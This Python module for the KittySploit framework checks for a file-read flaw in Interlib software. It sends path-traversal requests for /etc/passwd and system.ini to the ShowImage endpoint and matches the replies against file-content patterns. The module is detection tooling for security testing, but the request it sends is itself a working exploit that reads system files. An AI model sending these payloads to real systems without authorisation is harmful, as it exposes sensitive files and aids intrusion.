#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Interlib has an arbitrary file read vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Interlib - Local File Inclusion Detection',
        'description': 'Interlib has an arbitrary file read vulnerability. Attackers can use the vulnerability to read any file.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'interlib', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
            'https://forum.butian.net/article/217',
        ],
    }

    def run(self):
        for path in ('/interlib/report/ShowImage?localPath=etc/passwd', '/interlib/report/ShowImage?localPath=C:\\Windows\\system.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('image/jpg',)
            body_regexes = ('root:.*:0:0:', 'for 16-bit app support',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Interlib - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

